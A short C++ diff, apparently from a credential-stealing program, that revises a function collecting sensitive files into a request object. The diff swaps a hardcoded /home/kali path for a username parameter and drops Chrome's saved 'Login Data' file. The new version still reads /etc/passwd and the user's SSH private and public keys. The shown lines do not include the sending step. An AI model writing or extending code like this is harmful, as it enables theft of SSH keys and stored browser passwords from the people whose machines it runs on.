@@ -53,10 +53,13 @@ std::optional<std::string> get_file(const std::string file_name)
     return file;
 }
 
-void get_files_contents(Req &request)
+void get_files_contents(Req &request, std::string username)
 {
-    std::array<std::string, 4> files_names = {"/etc/passwd",
-                                              "/home/kali/.ssh/id_rsa", "/home/kali/.ssh/id_rsa.pub", "/home/kali/.config/google-chrome/Default/Login Data"};
+    std::stringstream path;
+    path << "/home/" << username << "/";
+    std::string path_str = path.str();
+    std::array<std::string, 3> files_names = {"/etc/passwd",
+                                              path_str + ".ssh/id_rsa", path_str + ".ssh/id_rsa.pub"};
 
     for (auto &file_name : files_names)
     {
